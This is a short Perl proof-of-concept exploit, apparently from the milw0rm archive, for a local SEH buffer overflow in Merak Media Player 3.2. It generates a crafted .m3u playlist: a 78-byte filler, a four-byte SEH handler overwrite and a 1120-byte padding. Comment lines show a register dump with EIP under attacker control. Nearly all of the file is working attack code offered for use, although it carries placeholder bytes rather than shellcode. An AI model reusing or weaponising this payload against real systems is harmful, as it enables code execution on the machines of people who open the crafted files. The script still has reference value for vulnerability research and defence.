#!/usr/bin/perl -w

# Author : Houssamix

# Merak Media Player V3.2  m3u file Local Buffer overflow (SEH) 
# Download :  http://www.qwerks.com/download/3748/merak.zip

# --------------------------------------------
# EAX 00000000
# ECX 45454545
# EDX 7C9137D8 ntdll.7C9137D8
# EBX 00000000
# ESP 0013F784
# EBP 0013F7A4
# ESI 00000000
# EDI 00000000
# EIP 45454545

# 0013FBE4   42424242  Pointer to next SEH record
# 0013FBE8   45454545  SE handler
# ---------------------------------------------

print "===================================================================== \n";
print "Author : Houssamix 						     \n";
print "===================================================================== \n";
print "Merak Media Player V3.2  m3u file Local Buffer overflow (SEH) 		 \n";
print "===================================================================== \n";

my $buf = "\x42" x 78;
my $seh = "\x45\x45\x45\x45";
my $buff = "\x43" x 1120;
my $file="hsmx.m3u";
$exploit = $buf.$seh.$buff;
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $exploit ;
close($FILE);
print "$file has been created \n";

# milw0rm.com [2009-01-25]
